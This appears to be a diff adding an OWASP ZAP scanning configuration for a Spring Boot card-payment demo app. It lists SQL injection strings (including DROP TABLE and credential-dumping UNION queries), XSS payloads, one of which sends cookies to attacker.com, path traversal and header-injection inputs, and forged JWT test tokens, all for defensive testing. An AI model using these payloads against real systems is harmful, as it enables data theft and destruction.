@@ -1,0 +1,852 @@
+# OWASP ZAP 2.16.1 Automated Security Scanning Configuration
+# CardDemo Spring Boot Microservices Security Testing Framework
+# 
+# This configuration provides comprehensive security scanning for the modernized CardDemo
+# financial transaction processing system, covering REST API endpoints, JWT authentication flows,
+# and PCI DSS compliance validation with zero tolerance for HIGH/CRITICAL vulnerabilities.
+#
+# Integration Points:
+# - Spring Security 6.x JWT authentication testing
+# - PostgreSQL database security validation
+# - React frontend security assessment
+# - Spring Cloud Gateway API security scanning
+# - Comprehensive vulnerability assessment automation
+
+---
+version: "2.16.1"
+metadata:
+  project: "CardDemo Security Scanning Configuration"
+  version: "1.0.0"
+  created_date: "2024-07-27"
+  description: "Comprehensive OWASP ZAP security scanning configuration for Spring Boot microservices with JWT authentication, PCI DSS compliance testing, and automated vulnerability assessment"
+  compliance_frameworks:
+    - "PCI DSS 3.2.1"
+    - "SOX Section 404"
+    - "GDPR Article 32"
+  target_architecture: "Spring Boot 3.2.x microservices with PostgreSQL 15+ and Redis 7+"
+
+# ZAP Security Scan Configuration Primary Export
+ZAPSecurityScanConfiguration:
+  description: "Primary OWASP ZAP configuration for automated security scanning of CardDemo Spring Boot REST API endpoints"
+  
+  # Global Scanner Settings
+  scanner_settings:
+    zap_version: "2.16.1"
+    scan_mode: "automated"
+    target_environment: "integration"
+    baseline_scan_timeout: "30m"
+    active_scan_timeout: "60m"
+    spider_timeout: "15m"
+    ajax_spider_timeout: "20m"
+    
+    # Performance Optimization
+    thread_count: 4
+    max_scan_duration: "120m"
+    memory_allocation: "4096m"
+    concurrent_scans: 2
+    
+    # Reporting Configuration
+    report_formats: ["html", "json", "xml", "md"]
+    report_directory: "/opt/zaproxy/reports"
+    include_false_positives: false
+    include_informational: true
+
+  # Target Application Configuration
+  target_application:
+    base_url: "http://localhost:8080"
+    application_name: "CardDemo Spring Boot Microservices"
+    context_name: "carddemo-security-context"
+    
+    # Spring Cloud Gateway Configuration
+    gateway_endpoints:
+      - path: "/api/auth/*"
+        description: "Authentication Service endpoints"
+        scan_priority: "HIGH"
+      - path: "/api/account/*"
+        description: "Account management endpoints"
+        scan_priority: "HIGH"
+      - path: "/api/card/*"
+        description: "Card management endpoints"
+        scan_priority: "MEDIUM"
+      - path: "/api/transaction/*"
+        description: "Transaction processing endpoints"
+        scan_priority: "HIGH"
+      - path: "/api/users/*"
+        description: "User management endpoints (ADMIN only)"
+        scan_priority: "CRITICAL"
+      - path: "/actuator/*"
+        description: "Spring Boot Actuator endpoints"
+        scan_priority: "MEDIUM"
+
+  # API Endpoint Scan Configurations
+  api_endpoints:
+    authentication_endpoints:
+      - endpoint: "/api/auth/login"
+        method: "POST"
+        description: "Primary JWT authentication endpoint"
+        vulnerability_categories:
+          - "Authentication Bypass"
+          - "Brute Force"
+          - "SQL Injection"
+          - "XSS"
+          - "Session Management"
+        test_payloads:
+          - username: "admin"
+            password: "admin123"
+          - username: "' OR '1'='1"
+            password: "test"
+          - username: "<script>alert('xss')</script>"
+            password: "test"
+        expected_responses: [200, 401, 400]
+        
+      - endpoint: "/api/auth/logout"
+        method: "POST"
+        description: "Session termination endpoint"
+        auth_required: true
+        vulnerability_categories:
+          - "Session Management"
+          - "CSRF"
+        expected_responses: [200, 401]
+        
+      - endpoint: "/api/auth/validate"
+        method: "POST"
+        description: "JWT token validation endpoint"
+        auth_required: true
+        vulnerability_categories:
+          - "JWT Manipulation"
+          - "Token Hijacking"
+        expected_responses: [200, 401]
+        
+      - endpoint: "/api/auth/refresh"
+        method: "POST"
+        description: "JWT token refresh endpoint"
+        auth_required: true
+        vulnerability_categories:
+          - "JWT Security"
+          - "Token Replay"
+        expected_responses: [200, 401]
+
+    account_endpoints:
+      - endpoint: "/api/account/view/{accountId}"
+        method: "GET"
+        description: "Account information retrieval"
+        auth_required: true
+        path_parameters:
+          - name: "accountId"
+            test_values: ["123456789", "0", "-1", "999999999999", "admin", "<script>", "' OR '1'='1"]
+        vulnerability_categories:
+          - "Authorization Bypass"
+          - "Path Traversal"
+          - "SQL Injection"
+          - "IDOR (Insecure Direct Object Reference)"
+        expected_responses: [200, 401, 403, 404]
+        
+      - endpoint: "/api/accounts/{accountId}"
+        method: "PUT"
+        description: "Account information update"
+        auth_required: true
+        path_parameters:
+          - name: "accountId"
+            test_values: ["123456789", "0", "-1", "../admin", "' UNION SELECT"]
+        request_body_tests:
+          - content_type: "application/json"
+            payloads:
+              - '{"accountBalance": "999999999999.99"}'
+              - '{"accountBalance": "<script>alert(1)</script>"}'
+              - '{"accountId": "admin"}'
+        vulnerability_categories:
+          - "Authorization Bypass"
+          - "Business Logic Flaws"
+          - "SQL Injection"
+          - "XSS"
+        expected_responses: [200, 400, 401, 403]
+
+    user_management_endpoints:
+      - endpoint: "/api/users"
+        method: "GET"
+        description: "List all users (ADMIN only)"
+        auth_required: true
+        required_roles: ["ROLE_ADMIN"]
+        vulnerability_categories:
+          - "Authorization Bypass"
+          - "Privilege Escalation"
+          - "Information Disclosure"
+        expected_responses: [200, 401, 403]
+        
+      - endpoint: "/api/users/{userId}"
+        method: "GET"
+        description: "Get user by ID (ADMIN only)"
+        auth_required: true
+        required_roles: ["ROLE_ADMIN"]
+        path_parameters:
+          - name: "userId"
+            test_values: ["TESTUSER", "ADMIN", "../etc/passwd", "' OR '1'='1"]
+        vulnerability_categories:
+          - "Authorization Bypass"
+          - "Path Traversal"
+          - "SQL Injection"
+          - "IDOR"
+        expected_responses: [200, 401, 403, 404]
+        
+      - endpoint: "/api/users"
+        method: "POST"
+        description: "Create new user (ADMIN only)"
+        auth_required: true
+        required_roles: ["ROLE_ADMIN"]
+        request_body_tests:
+          - content_type: "application/json"
+            payloads:
+              - '{"userId": "TESTUSER", "password": "password123", "userType": "A"}'
+              - '{"userId": "admin", "password": "admin", "userType": "A"}'
+              - '{"userId": "<script>", "password": "test", "userType": "U"}'
+        vulnerability_categories:
+          - "Authorization Bypass"
+          - "Privilege Escalation" 
+          - "XSS"
+          - "Mass Assignment"
+        expected_responses: [201, 400, 401, 403]
+
+    transaction_endpoints:
+      - endpoint: "/api/transaction/add"
+        method: "POST"  
+        description: "Add new transaction"
+        auth_required: true
+        request_body_tests:
+          - content_type: "application/json"
+            payloads:
+              - '{"accountId": "123456789", "amount": "100.00", "transactionType": "DEBIT"}'
+              - '{"accountId": "123456789", "amount": "-999999.99", "transactionType": "CREDIT"}'
+              - '{"accountId": "<script>", "amount": "100", "transactionType": "DEBIT"}'
+        vulnerability_categories:
+          - "Business Logic Flaws"
+          - "SQL Injection"
+          - "XSS"
+          - "Authorization Bypass"
+        expected_responses: [201, 400, 401, 403]
+
+  # Authentication Testing Scenarios
+  authentication_scenarios:
+    jwt_token_testing:
+      description: "Comprehensive JWT authentication flow testing using predefined token dataset"
+      
+      valid_admin_token:
+        token: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJURVNUQURNMSIsInVzZXJUeXBlIjoiQSIsInJvbGUiOiJST0xFX0FETUlOIiwic2Vzc2lvbklkIjoiQ0FSRERFTU9fU0VTU0lPTl9hZG1pbi10ZXN0LXNlc3Npb24tMDAxIiwiZmlyc3ROYW1lIjoiU3lzdGVtIiwibGFzdE5hbWUiOiJBZG1pbmlzdHJhdG9yIiwiaXNzIjoiQ2FyZERlbW8tQXV0aC1TZXJ2aWNlIiwiaWF0IjoxNzIyMTA0NDAwLCJleHAiOjE3MjIxMDYyMDB9.kZ8r5VJ2K9Y8p3NfWqMbU6vDx7EcQtR2mA4sH1pL9zA"
+        user_type: "ADMIN"
+        roles: ["ROLE_ADMIN", "ROLE_USER"]
+        test_endpoints:
+          - "/api/users"
+          - "/api/users/TESTUSER"
+          - "/api/account/view/123456789"
+          - "/actuator/health"
+        expected_access: "GRANTED"
+        
+      valid_user_token:
+        token: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJURVNUVVNFUiIsInVzZXJUeXBlIjoiVSIsInJvbGUiOiJST0xFX1VTRVIiLCJzZXNzaW9uSWQiOiJDQVJEREVNT19TRVNTSU9OX3VzZXItdGVzdC1zZXNzaW9uLTAwMSIsImZpcnN0TmFtZSI6IlN0YW5kYXJkIiwibGFzdE5hbWUiOiJVc2VyIiwiaXNzIjoiQ2FyZERlbW8tQXV0aC1TZXJ2aWNlIiwiaWF0IjoxNzIyMTA0NDAwLCJleHAiOjE3MjIxMDYyMDB9.mW3t8PL5M2X6k1AgNrFhV4xEy9DsJuK7nC8oQ5tN6qB"
+        user_type: "USER"
+        roles: ["ROLE_USER"]
+        test_endpoints:
+          - "/api/account/view/123456789"
+          - "/api/transaction/add"
+          - "/api/users"  # Should be DENIED
+        expected_access_patterns:
+          "/api/account/view/123456789": "GRANTED"
+          "/api/transaction/add": "GRANTED"
+          "/api/users": "DENIED"
+          
+      expired_token:
+        token: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJURVNUVVNFUiIsInVzZXJUeXBlIjoiVSIsInJvbGUiOiJST0xFX1VTRVIiLCJzZXNzaW9uSWQiOiJDQVJEREVNT19TRVNTSU9OX2V4cGlyZWQtdGVzdC1zZXNzaW9uLTAwMSIsImZpcnN0TmFtZSI6IlN0YW5kYXJkIiwibGFzdE5hbWUiOiJVc2VyIiwiaXNzIjoiQ2FyZERlbW8tQXV0aC1TZXJ2aWNlIiwiaWF0IjoxNzA1MzEyODAwLCJleHAiOjE3MDUzMTQ2MDB9.pX7v2QL9H8T3m5BgOsChW9yDx6FtMnK4oE2rF8qO7vA"
+        test_purpose: "Token expiration validation"
+        expected_response: 401
+        expected_error: "ExpiredJwtException"
+        test_endpoints:
+          - "/api/account/view/123456789"
+          - "/api/users"
+          
+      invalid_signature_token:
+        token: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJURVNUVVNFUiIsInVzZXJUeXBlIjoiVSIsInJvbGUiOiJST0xFX1VTRVIiLCJzZXNzaW9uSWQiOiJDQVJEREVNT19TRVNTSU9OX2ludmFsaWQtc2lnbmF0dXJlLXRlc3QtMDAxIiwiZmlyc3ROYW1lIjoiU3RhbmRhcmQiLCJsYXN0TmFtZSI6IlVzZXIiLCJpc3MiOiJDYXJkRGVtby1BdXRoLVNlcnZpY2UiLCJpYXQiOjE3MjIxMDQ0MDAsImV4cCI6MTcyMjEwNjIwMH0.INVALID_SIGNATURE_FOR_TESTING_PURPOSES_ONLY"
+        test_purpose: "JWT signature validation"
+        expected_response: 401
+        expected_error: "SignatureException"
+        test_endpoints:
+          - "/api/account/view/123456789"
+          - "/api/auth/validate"
+          
+      malformed_token:
+        token: "MALFORMED.TOKEN.STRUCTURE.INVALID.BASE64.ENCODING"
+        test_purpose: "Malformed token handling"
+        expected_response: 401
+        expected_error: "MalformedJwtException"
+        test_endpoints:
+          - "/api/account/view/123456789"
+          - "/api/auth/login"
+
+    authentication_bypass_tests:
+      description: "Comprehensive authentication bypass testing scenarios"
+      test_scenarios:
+        - name: "Missing Authorization Header"
+          request_config:
+            headers: {}
+          expected_response: 401
+          test_endpoints:
+            - "/api/account/view/123456789"
+            - "/api/users"
+            
+        - name: "Invalid Bearer Token Format"
+          request_config:
+            headers:
+              Authorization: "InvalidPrefix token_here"
+          expected_response: 401
+          test_endpoints:
+            - "/api/account/view/123456789"
+            
+        - name: "Empty Bearer Token"
+          request_config:
+            headers:
+              Authorization: "Bearer "
+          expected_response: 401
+          test_endpoints:
+            - "/api/account/view/123456789"
+            
+        - name: "SQL Injection in JWT Claims"
+          request_config:
+            headers:
+              Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiInIE9SICcxJz0nMSIsInJvbGUiOiJST0xFX0FETUlOIn0.invalid_signature"
+          expected_response: 401
+          test_endpoints:
+            - "/api/users"
+
+# Vulnerability Scanning Profiles Export
+VulnerabilityScanningProfiles:
+  description: "Specialized vulnerability scanning profiles for comprehensive security assessment"
+  
+  # SQL Injection Testing Profile
+  sql_injection_testing:
+    enabled: true
+    scan_strength: "HIGH"
+    timeout: "30m"
+    test_parameters:
+      - "query_parameters"
+      - "form_data"
+      - "json_body"
+      - "path_parameters"
+      - "headers"
+    payloads:
+      basic_sql_injection:
+        - "' OR '1'='1"
+        - "'; DROP TABLE users; --"
+        - "' UNION SELECT NULL, username, password FROM users --"
+        - "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
+      blind_sql_injection:
+        - "' AND (SELECT SUBSTRING(version(), 1, 1)) = '5"
+        - "' AND (SELECT COUNT(*) FROM users WHERE username='admin') = 1 --"
+      time_based_sql_injection:
+        - "'; WAITFOR DELAY '00:00:05' --"
+        - "' OR (SELECT pg_sleep(5)) --"
+    target_endpoints:
+      - "/api/account/view/{accountId}"
+      - "/api/users/{userId}"
+      - "/api/auth/login"
+      - "/api/transaction/add"
+
+  # XSS Vulnerability Scanning
+  xss_vulnerability_scanning:
+    enabled: true
+    scan_types: ["reflected", "stored", "dom"]
+    scan_strength: "MEDIUM"
+    timeout: "20m"
+    payloads:
+      reflected_xss:
+        - "<script>alert('XSS')</script>"
+        - "<img src=x onerror=alert('XSS')>"
+        - "javascript:alert('XSS')"
+        - "<svg onload=alert('XSS')>"
+      stored_xss:
+        - "<script>document.location='http://attacker.com/'+document.cookie</script>"
+        - "<iframe src=javascript:alert('XSS')></iframe>"
+      dom_xss:
+        - "#<script>alert('XSS')</script>"
+        - "javascript:alert('XSS')"
+    target_endpoints:
+      - "/api/auth/login"
+      - "/api/users"
+      - "/api/account/view/{accountId}"
+
+  # CSRF Protection Validation
+  csrf_protection_validation:
+    enabled: true
+    scan_strength: "MEDIUM"
+    timeout: "15m"
+    test_scenarios:
+      - name: "Missing CSRF Token"
+        description: "Test endpoints without CSRF protection"
+        target_methods: ["POST", "PUT", "DELETE"]
+      - name: "Invalid CSRF Token"
+        description: "Test with manipulated CSRF tokens"
+        token_manipulations:
+          - "empty_token"
+          - "invalid_token"
+          - "expired_token"
+    target_endpoints:
+      - "/api/users"
+      - "/api/accounts/{accountId}"
+      - "/api/transaction/add"
+
+  # Authentication Bypass Testing
+  authentication_bypass_testing:
+    enabled: true
+    scan_strength: "HIGH" 
+    timeout: "25m"
+    test_categories:
+      jwt_manipulation:
+        - "algorithm_confusion"
+        - "signature_bypass"
+        - "token_replay"
+        - "claim_manipulation"
+      session_management:
+        - "session_fixation"
+        - "session_hijacking"
+        - "concurrent_session"
+      authorization_bypass:
+        - "horizontal_privilege_escalation"
+        - "vertical_privilege_escalation"
+        - "role_manipulation"
+
+  # Authorization Flow Security
+  authorization_flow_security:
+    enabled: true
+    scan_strength: "HIGH"
+    timeout: "20m"
+    test_scenarios:
+      role_based_access_control:
+        - test_name: "Admin Only Endpoints"
+          endpoints: ["/api/users", "/api/users/{userId}"]
+          required_role: "ROLE_ADMIN"
+          test_with_roles: ["ROLE_USER", "ROLE_GUEST", null]
+          expected_response: 403
+        - test_name: "User Accessible Endpoints"
+          endpoints: ["/api/account/view/{accountId}", "/api/transaction/add"]
+          required_role: "ROLE_USER"
+          test_with_roles: ["ROLE_ADMIN", "ROLE_USER"]
+          expected_response: [200, 201]
+
+  # API Security Validation
+  api_security_validation:
+    enabled: true
+    scan_strength: "HIGH"
+    timeout: "30m"
+    test_categories:
+      input_validation:
+        - "oversized_requests" 
+        - "malformed_json"
+        - "type_confusion"
+        - "boundary_value_testing"
+      rate_limiting:
+        - "brute_force_protection"
+        - "dos_protection" 
+        - "api_throttling"
+      content_type_validation:
+        - "content_type_bypass"
+        - "multipart_parsing"
+        - "xml_external_entity"
+    test_configurations:
+      oversized_request_test:
+        max_payload_size: "10MB"
+        test_endpoints: ["/api/auth/login", "/api/transaction/add"]
+      rate_limiting_test:
+        requests_per_minute: 1000
+        test_duration: "5m"
+        test_endpoints: ["/api/auth/login"]
+
+  # Session Management Testing
+  session_management_testing:
+    enabled: true
+    scan_strength: "MEDIUM"
+    timeout: "15m"
+    test_scenarios:
+      - name: "Session Timeout Validation"
+        description: "Verify session expiration behavior"
+        test_duration: "35m"  # JWT default is 30 minutes
+      - name: "Session Invalidation"
+        description: "Test proper session cleanup on logout"
+        endpoints: ["/api/auth/logout"]
+      - name: "Concurrent Session Handling"
+        description: "Test multiple active sessions"
+        concurrent_logins: 5
+
+  # Input Validation Scanning
+  input_validation_scanning:
+    enabled: true
+    scan_strength: "HIGH"
+    timeout: "25m"
+    validation_categories:
+      numeric_validation:
+        test_values: ["-1", "0", "999999999999999", "abc", "null", "undefined"]
+        target_parameters: ["accountId", "userId", "amount"]
+      string_validation:
+        test_values: ["", " ", "null", "../etc/passwd", "<script>", "' OR '1'='1"]
+        target_parameters: ["username", "firstName", "lastName"]
+      json_validation:
+        malformed_json_tests:
+          - '{"missing_quote: "value"}'
+          - '{"key": "value",}'
+          - '{key": "value"}'
+          - 'null'
+          - '[]'
+
+  # Output Encoding Verification
+  output_encoding_verification:
+    enabled: true
+    scan_strength: "MEDIUM"
+    timeout: "10m"
+    test_scenarios:
+      - name: "Response Header Injection"
+        description: "Test for header injection vulnerabilities"
+        test_payloads: ["\r\nX-Injected: true", "\nSet-Cookie: injected=true"]
+      - name: "JSON Response Validation"
+        description: "Verify proper JSON encoding"
+        test_inputs: ["<script>", "&lt;script&gt;", "\"quotes\""]
+
+# PCI DSS Compliance Testing Configuration Export
+PCIDSSComplianceTestingConfiguration:
+  description: "PCI DSS compliance validation for cardholder data protection and security controls"
+  
+  # PCI DSS Requirement Testing Matrix
+  requirement_testing:
+    requirement_3_cardholder_data_protection:
+      description: "Protect stored cardholder data"
+      test_scenarios:
+        - name: "Card Number Exposure Test"
+          description: "Verify card numbers are not exposed in responses"
+          test_endpoints:
+            - "/api/account/view/{accountId}"
+            - "/api/card/list/{accountId}"
+          search_patterns:
+            - regex: "\b4[0-9]{12}(?:[0-9]{3})?\b"  # Visa pattern
+            - regex: "\b5[1-5][0-9]{14}\b"          # Mastercard pattern
+            - regex: "\b3[47][0-9]{13}\b"           # AMEX pattern
+          expected_result: "NOT_FOUND"
+          
+        - name: "Data Encryption Validation"
+          description: "Verify sensitive data is encrypted at rest"
+          database_tests:
+            - table: "cards"
+            - column: "card_number"
+            - encryption_check: "pgcrypto_validation"
+          expected_result: "ENCRYPTED"
+
+    requirement_4_transmission_security:
+      description: "Encrypt transmission of cardholder data across open networks"
+      test_scenarios:
+        - name: "TLS Configuration Test"
+          description: "Verify TLS 1.3 enforcement"
+          ssl_tests:
+            - protocol_version: "TLSv1.3"
+            - cipher_suite_validation: true
+            - certificate_validation: true
+          expected_result: "COMPLIANT"
+          
+        - name: "HTTP to HTTPS Redirect"
+          description: "Verify HTTP requests are redirected to HTTPS"
+          test_urls:
+            - "http://localhost:8080/api/auth/login"
+            - "http://localhost:8080/api/account/view/123"
+          expected_response: 301
+
+    requirement_7_access_control:
+      description: "Restrict access to cardholder data by business need-to-know"
+      test_scenarios:
+        - name: "Role-Based Access Control"
+          description: "Verify proper role-based restrictions"
+          access_control_tests:
+            - endpoint: "/api/card/list/{accountId}"
+              required_role: "ROLE_USER"
+              test_scenarios:
+                - user_role: "ROLE_ADMIN"
+                  expected_access: "GRANTED"
+                - user_role: "ROLE_USER"
+                  expected_access: "GRANTED"
+                - user_role: null
+                  expected_access: "DENIED"
+
+    requirement_8_authentication:
+      description: "Identify and authenticate access to system components"
+      test_scenarios:
+        - name: "Strong Authentication Validation"
+          description: "Verify JWT authentication strength"
+          authentication_tests:
+            - token_algorithm: "HS256"
+            - token_expiration: "30_minutes"
+            - password_policy: "bcrypt_12_rounds"
+          expected_result: "COMPLIANT"
+          
+        - name: "Multi-Factor Authentication Readiness"
+          description: "Verify MFA capability"
+          mfa_tests:
+            - totp_support: "enabled"
+            - sms_support: "configurable"
+          expected_result: "FRAMEWORK_READY"
+
+    requirement_10_logging:
+      description: "Track and monitor all access to network resources and cardholder data"
+      test_scenarios:
+        - name: "Access Logging Validation"
+          description: "Verify comprehensive access logging"
+          logging_tests:
+            - authentication_events: "logged"
+            - authorization_events: "logged"
+            - data_access_events: "logged"
+            - admin_actions: "logged"
+          log_format: "structured_json"
+          retention_period: "7_years"
+
+  # Network Security Validation
+  network_security_validation:
+    enabled: true
+    test_categories:
+      firewall_testing:
+        - name: "Port Scanning"
+          description: "Verify only required ports are open"
+          allowed_ports: [8080, 443, 22]
+          scan_type: "tcp_connect"
+        - name: "Service Enumeration"
+          description: "Identify running services"
+          service_detection: true
+          version_detection: true
+
+      network_segmentation:
+        - name: "DMZ Isolation"
+          description: "Verify proper network segmentation"
+          test_connectivity:
+            - from: "web_tier"
+              to: "database_tier"
+              expected: "BLOCKED_DIRECT"
+            - from: "web_tier" 
+              to: "app_tier"
+              expected: "ALLOWED"
+
+  # Vulnerability Management Scanning
+  vulnerability_management_scanning:
+    enabled: true
+    scan_categories:
+      infrastructure_scanning:
+        - name: "Operating System Vulnerabilities"
+          description: "Scan for OS-level vulnerabilities"
+          scan_type: "authenticated"
+          vulnerability_feeds: ["CVE", "NVD"]
+        - name: "Container Image Scanning"
+          description: "Scan Docker images for vulnerabilities"
+          registries: ["docker.io", "local"]
+          base_images: ["openjdk:21", "postgres:15", "redis:7"]
+
+      application_scanning:
+        - name: "Dependency Scanning"
+          description: "Scan for vulnerable dependencies"
+          package_managers: ["maven", "npm"]
+          vulnerability_databases: ["OSS_INDEX", "SNYK"]
+        - name: "SAST Integration"
+          description: "Static application security testing"
+          tools: ["sonarqube", "spotbugs"]
+
+  # Security Monitoring Configuration
+  security_monitoring_configuration:
+    enabled: true
+    monitoring_categories:
+      real_time_monitoring:
+        - metric: "failed_authentication_rate"
+          threshold: ">5_per_minute"
+          alert_level: "HIGH"
+        - metric: "privilege_escalation_attempts"
+          threshold: ">0"
+          alert_level: "CRITICAL"
+        - metric: "data_access_anomalies"
+          threshold: "statistical_outlier"
+          alert_level: "MEDIUM"
+
+      compliance_reporting:
+        - report_type: "pci_dss_quarterly"
+          format: "pdf"
+          distribution: ["security_team", "compliance_officer"]
+        - report_type: "vulnerability_summary"
+          frequency: "weekly"
+          format: "json"
+
+  # Audit Logging Verification
+  audit_logging_verification:
+    enabled: true
+    log_validation_tests:
+      authentication_events:
+        - event_type: "login_success"
+          required_fields: ["timestamp", "user_id", "source_ip", "session_id"]
+        - event_type: "login_failure"
+          required_fields: ["timestamp", "username_attempted", "source_ip", "failure_reason"]
+        - event_type: "logout"
+          required_fields: ["timestamp", "user_id", "session_id", "session_duration"]
+
+      authorization_events:
+        - event_type: "access_granted"
+          required_fields: ["timestamp", "user_id", "resource", "action", "result"]
+        - event_type: "access_denied"
+          required_fields: ["timestamp", "user_id", "resource", "action", "denial_reason"]
+
+      data_access_events:
+        - event_type: "cardholder_data_access"
+          required_fields: ["timestamp", "user_id", "card_id", "access_type", "justification"]
+        - event_type: "sensitive_data_modification"
+          required_fields: ["timestamp", "user_id", "table", "record_id", "old_value", "new_value"]
+
+  # Data Encryption Validation
+  data_encryption_validation:
+    enabled: true
+    encryption_tests:
+      database_encryption:
+        - table: "cards"
+          column: "card_number"
+          encryption_method: "pgcrypto"
+          key_management: "application_controlled"
+        - table: "users"
+          column: "password_hash"
+          encryption_method: "bcrypt"
+          rounds: "12_minimum"
+
+      transmission_encryption:
+        - protocol: "TLS"
+          version: "1.3"
+          cipher_suites: ["TLS_AES_256_GCM_SHA384", "TLS_AES_128_GCM_SHA256"]
+        - application_level: "JWT"
+          algorithm: "HS256"
+          key_rotation: "configurable"
+
+# Advanced Security Testing Configuration
+advanced_security_testing:
+  business_logic_testing:
+    enabled: true
+    test_scenarios:
+      - name: "Transaction Amount Validation"
+        description: "Test for negative amounts and overflow conditions"
+        test_cases:
+          - endpoint: "/api/transaction/add"
+            payloads:
+              - '{"amount": "-1000.00", "type": "CREDIT"}'
+              - '{"amount": "999999999999.99", "type": "DEBIT"}'
+              - '{"amount": "0.001", "type": "CREDIT"}'
+        expected_behavior: "VALIDATION_ERROR"
+
+      - name: "Account Balance Manipulation"
+        description: "Test for unauthorized balance modifications"
+        test_cases:
+          - endpoint: "/api/accounts/{accountId}"
+            manipulation_attempts:
+              - "direct_balance_update"
+              - "concurrent_transaction_race"
+              - "negative_balance_creation"
+
+  api_abuse_testing:
+    enabled: true
+    abuse_scenarios:
+      - name: "Rate Limiting Bypass"
+        description: "Test rate limiting effectiveness"
+        attack_patterns:
+          - "distributed_requests"
+          - "header_manipulation"
+          - "ip_rotation_simulation"
+        target_endpoints: ["/api/auth/login"]
+
+      - name: "Resource Exhaustion"
+        description: "Test for DoS vulnerabilities"
+        attack_vectors:
+          - "large_payload_attack"
+          - "slow_http_attack"
+          - "connection_exhaustion"
+
+# Scan Execution Configuration
+scan_execution:
+  automated_scheduling:
+    enabled: true
+    schedules:
+      - scan_type: "baseline"
+        frequency: "daily"
+        time: "02:00"
+        duration_limit: "30m"
+      - scan_type: "full_scan"
+        frequency: "weekly"
+        day: "sunday"
+        time: "01:00"
+        duration_limit: "120m"
+      - scan_type: "compliance_scan"
+        frequency: "monthly"
+        day: "first_sunday"
+        time: "00:00"
+        duration_limit: "180m"
+
+  quality_gates:
+    zero_high_critical_tolerance:
+      enabled: true
+      severity_thresholds:
+        critical: 0
+        high: 0
+        medium: 10
+        low: 50
+      scan_failure_actions:
+        - "generate_detailed_report"
+        - "notify_security_team"
+        - "block_deployment"
+        - "create_jira_tickets"
+
+  integration_endpoints:
+    ci_cd_webhook: "http://jenkins:8080/job/security-scan-results/build"
+    security_dashboard: "http://grafana:3000/d/security/security-dashboard"
+    notification_channels:
+      - type: "slack"
+        webhook: "https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"
+        channel: "#security-alerts"
+      - type: "email"
+        recipients: ["security-team@carddemo.com", "devops@carddemo.com"]
+
+# Performance and Resource Configuration
+performance_configuration:
+  resource_limits:
+    memory_limit: "4Gi"
+    cpu_limit: "2000m"
+    disk_space: "10Gi"
+    network_bandwidth: "100Mbps"
+    
+  scan_optimization:
+    parallel_scanning: true
+    max_parallel_threads: 4
+    request_throttling: "100req/sec"
+    connection_pooling: true
+    
+  timeout_configuration:
+    connection_timeout: "30s"
+    read_timeout: "60s"
+    scan_timeout: "120m"
+    report_generation_timeout: "10m"
+
+# Final Configuration Validation
+configuration_validation:
+  startup_checks:
+    - "target_application_reachable"
+    - "authentication_tokens_valid"
+    - "database_connectivity"
+    - "logging_configuration"
+    - "report_directory_writable"
+    
+  health_monitoring:
+    enabled: true
+    metrics_endpoint: "/metrics"
+    health_check_interval: "30s"
+    failure_threshold: 3
+    
+  disaster_recovery:
+    scan_state_backup: true
+    report_backup_location: "/opt/zaproxy/backups"
+    configuration_versioning: true
+
+# Configuration Metadata
+config_metadata:
+  schema_version: "1.0"
+  last_modified: "2024-07-27T12:00:00Z"
+  maintained_by: "CardDemo Security Team"
+  review_frequency: "quarterly"
+  compliance_validation_date: "2024-07-27"
+  next_review_date: "2024-10-27"
